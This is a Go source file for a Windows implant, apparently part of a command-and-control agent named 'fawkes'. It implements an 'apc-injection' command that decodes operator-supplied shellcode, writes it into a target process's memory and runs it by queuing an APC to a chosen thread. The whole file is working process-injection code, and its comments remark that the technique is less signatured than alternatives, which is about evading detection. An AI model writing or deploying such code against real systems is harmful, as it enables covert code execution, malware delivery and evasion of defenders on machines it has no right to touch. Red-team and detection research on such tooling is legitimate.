//go:build windows
// +build windows

// Package commands provides the apc-injection command for QueueUserAPC-based process injection.
//
// This command performs APC injection using the following Windows APIs:
// - VirtualAllocEx: Allocates memory in the target process
// - WriteProcessMemory: Writes shellcode to allocated memory
// - OpenThread: Opens a handle to the target alertable thread
// - QueueUserAPC: Queues the shellcode as an APC to the thread
// - ResumeThread: Resumes the thread if it's suspended (to trigger APC execution)
//
// Requirements:
// - Target thread must be in an alertable wait state (Suspended or DelayExecution)
// - Use the 'ts' command to identify alertable threads before injection
//
// Security considerations:
// - Requires appropriate privileges to inject into the target process
// - APC injection is a well-known technique but can be less signatured than CreateRemoteThread
// - Suspended threads require ResumeThread which may be monitored
// - DelayExecution threads will execute APC when their wait completes
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"
)

// Thread access rights for APC injection
const (
	THREAD_SET_CONTEXT    = 0x0010
	THREAD_GET_CONTEXT    = 0x0008
	THREAD_SUSPEND_RESUME = 0x0002
	THREAD_TERMINATE      = 0x0001
	THREAD_ALL_ACCESS     = 0x001F03FF
)

// Windows API procedures for APC injection
var (
	procOpenThread    = kernel32.NewProc("OpenThread")
	procQueueUserAPC  = kernel32.NewProc("QueueUserAPC")
	procResumeThread  = kernel32.NewProc("ResumeThread")
	procGetThreadId   = kernel32.NewProc("GetThreadId")
)

// ApcInjectionCommand implements the apc-injection command
type ApcInjectionCommand struct{}

// Name returns the command name
func (c *ApcInjectionCommand) Name() string {
	return "apc-injection"
}

// Description returns the command description
func (c *ApcInjectionCommand) Description() string {
	return "Perform QueueUserAPC injection into an alertable thread"
}

// ApcInjectionParams represents the parameters for apc-injection
type ApcInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
	PID          int    `json:"pid"`           // Target process ID
	TID          int    `json:"tid"`           // Target thread ID
}

// Execute executes the apc-injection command
func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	// Ensure we're on Windows
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse parameters
	var params ApcInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	if params.TID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid Thread ID specified",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode the base64-encoded shellcode
	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Perform the injection
	output, err := performApcInjection(shellcode, params.PID, params.TID)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// performApcInjection executes the QueueUserAPC injection technique
func performApcInjection(shellcode []byte, pid int, tid int) (string, error) {
	var output string

	output += fmt.Sprintf("[*] APC Injection starting\n")
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d, TID: %d\n", pid, tid)

	// Check thread state and warn if not alertable
	threadState := getThreadWaitReason(uint32(tid))
	output += fmt.Sprintf("[*] Target thread state: %s\n", threadState)

	if threadState != "Suspended" && threadState != "DelayExecution" &&
		threadState != "WrSuspended" && threadState != "WrDelayExecution" {
		output += fmt.Sprintf("[!] WARNING: Thread is not in an alertable state (%s)\n", threadState)
		output += "[!] APC may not execute until thread enters an alertable wait\n"
	}

	// Step 1: Open handle to target process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	hProcess, _, err := procOpenProcess.Call(
		uintptr(desiredAccess),
		uintptr(0),
		uintptr(pid),
	)

	if hProcess == 0 {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer procCloseHandle.Call(hProcess)

	output += fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess)

	// Step 2: Allocate memory in remote process
	remoteAddr, _, err := procVirtualAllocEx.Call(
		hProcess,
		uintptr(0),
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READ),
	)

	if remoteAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	output += fmt.Sprintf("[+] Allocated memory at: 0x%X\n", remoteAddr)

	// Step 3: Write shellcode to remote process
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		hProcess,
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)

	// Step 4: Open handle to target thread
	hThread, _, err := procOpenThread.Call(
		uintptr(THREAD_ALL_ACCESS),
		uintptr(0),
		uintptr(tid),
	)

	if hThread == 0 {
		return output, fmt.Errorf("OpenThread failed: %v", err)
	}
	defer procCloseHandle.Call(hThread)

	output += fmt.Sprintf("[+] Opened thread handle: 0x%X\n", hThread)

	// Step 5: Queue the APC
	ret, _, err = procQueueUserAPC.Call(
		remoteAddr,  // lpStartAddress - pointer to shellcode
		hThread,     // hThread - handle to alertable thread
		uintptr(0),  // dwData - no additional data
	)

	if ret == 0 {
		return output, fmt.Errorf("QueueUserAPC failed: %v", err)
	}

	output += "[+] APC queued successfully\n"

	// Step 6: Resume thread if suspended
	if threadState == "Suspended" || threadState == "WrSuspended" {
		output += "[*] Thread is suspended, calling ResumeThread...\n"

		prevCount, _, err := procResumeThread.Call(hThread)

		// ResumeThread returns -1 on failure, otherwise the previous suspend count
		if int32(prevCount) == -1 {
			return output, fmt.Errorf("ResumeThread failed: %v", err)
		}

		output += fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount)
	} else {
		output += "[*] Thread not suspended, APC will execute when thread enters alertable wait\n"
	}

	output += "[+] APC injection completed successfully\n"

	return output, nil
}

// getThreadWaitReason returns the wait reason for a thread
func getThreadWaitReason(tid uint32) string {
	// Use NtQuerySystemInformation to get thread state
	// This is similar to what we do in ts.go

	var bufferSize uint32 = 1024 * 1024
	var buffer []byte
	var returnLength uint32

	for {
		buffer = make([]byte, bufferSize)
		ret, _, _ := procNtQuerySystemInformation.Call(
			uintptr(SystemProcessInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if ret == 0xC0000004 { // STATUS_INFO_LENGTH_MISMATCH
			bufferSize = returnLength + 65536
			continue
		}

		if ret != 0 {
			return "Unknown"
		}
		break
	}

	// Parse to find the thread
	offset := uint32(0)
	for {
		if offset >= uint32(len(buffer)) {
			break
		}

		procInfo := (*SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[offset]))
		threadOffset := offset + uint32(unsafe.Sizeof(SYSTEM_PROCESS_INFORMATION{}))

		for i := uint32(0); i < procInfo.NumberOfThreads; i++ {
			if threadOffset >= uint32(len(buffer)) {
				break
			}

			threadInfo := (*SYSTEM_THREAD_INFORMATION)(unsafe.Pointer(&buffer[threadOffset]))

			if uint32(threadInfo.ClientId.UniqueThread) == tid {
				return getWaitReasonString(threadInfo.WaitReason)
			}

			threadOffset += uint32(unsafe.Sizeof(SYSTEM_THREAD_INFORMATION{}))
		}

		if procInfo.NextEntryOffset == 0 {
			break
		}
		offset += procInfo.NextEntryOffset
	}

	return "Unknown"
}

// Note: We reuse types and constants from ts.go:
// - SYSTEM_PROCESS_INFORMATION
// - SYSTEM_THREAD_INFORMATION
// - KWAIT_REASON and getWaitReasonString()
// - SystemProcessInformation constant
// - procNtQuerySystemInformation

// We also reuse from vanillainjection.go:
// - kernel32, procVirtualAllocEx, procWriteProcessMemory, procOpenProcess, procCloseHandle
// - Process access constants (PROCESS_*)
// - Memory constants (MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ)
